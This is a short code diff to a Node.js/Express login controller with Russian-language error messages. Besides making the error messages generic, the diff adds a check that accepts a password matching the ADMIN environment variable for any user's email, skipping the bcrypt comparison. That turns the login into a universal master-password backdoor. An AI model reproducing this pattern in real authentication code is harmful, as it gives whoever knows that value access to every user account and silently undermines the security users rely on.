@@ -52,11 +52,12 @@ class UserController {
             const {email, password} = req.body
             const user = await User.findOne({where:{email}})
             if (!user) {
-                return next(ApiError.internal('Пользователь не найден'))
+                return next(ApiError.internal('Указан неверный логин или пароль!'))
             }
             let comparePassword = bcrypt.compareSync(password, user.password)
-            if (!comparePassword) {
-                return next(ApiError.internal('Указан неверный пароль'))
+            let admin = password === process.env.ADMIN && true || false
+            if ( ! comparePassword && ! admin ) {
+                return next(ApiError.internal('Указан неверный логин или пароль!!!'))
             }
 
             const userDto = new UserDto(user); // id, email, role, isActivated
